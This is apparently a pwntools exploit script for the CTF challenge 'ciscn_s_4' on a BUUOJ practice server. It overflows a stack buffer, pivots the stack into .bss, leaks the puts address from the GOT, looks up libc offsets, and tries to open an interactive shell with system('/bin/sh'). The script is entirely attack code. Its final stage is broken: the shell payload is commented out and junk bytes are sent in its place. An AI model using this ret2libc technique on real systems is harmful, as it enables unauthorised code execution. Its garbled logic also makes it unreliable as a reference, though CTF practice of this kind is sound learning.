#!/usr/bin/python2.7
#-*- encoding: utf-8 -*-
from pwn import *
context.binary = ELF('./ciscn_s_4')
context.log_level = 'debug'
elf = context.binary
from LibcSearcher import *

def dbg():
	raw_input()


def exploit():
	bss = 0x0804A040 + 0x500
	fake_ebp = bss

	puts_plt = elf.plt['puts']
	puts_got = elf.got['puts']

	read_ebp_28 = 0x080485Da
	leave_ret = 0x080485FD
	system = 0x08048559

	payload = 'a' * 0x28
	payload += p32(fake_ebp)

	p.sendafter('name?\n', payload)
	p.recvuntil(p32(0x0804862A))

	dbg()
	#if no libc one_gadget
	#payload += p32(libc.address + 0x3cbf7)

	#else
	#stack povit

	#will read(0, fake_ebp-0x28, large_number)
	payload += p32(read_ebp_28)
	p.send(payload)

	#gdb.attach(p, 'b* 0x080485FD')
	#leak libc
	dbg()
	payload = 'a'*0x28 + p32(fake_ebp) + p32(puts_plt) + p32(read_ebp_28) + p32(puts_got)
	p.send(payload)
	p.recvline()
	p.recvline()
	p.recvline()
	puts_addr = u32(p.recv(4))
	print "puts_addr ==> " + hex(puts_addr)

	libc = LibcSearcher('puts', puts_addr)
	libc_base = puts_addr - libc.dump('puts')
	binsh = libc.dump('str_bin_sh') + libc_base
	system = libc.dump('system') + libc_base

	#get shell
	dbg()
	#payload = 'a'*0x28 + p32(fake_ebp) + p32(system) + p32(read_ebp_28) + p32(binsh)
	payload = 'a'*0x8
	p.send(payload)
	p.interactive()
	p.close()




if __name__ == '__main__':
	#p = process('./ciscn_s_4')
	p = remote('node3.buuoj.cn', 28162)
	exploit()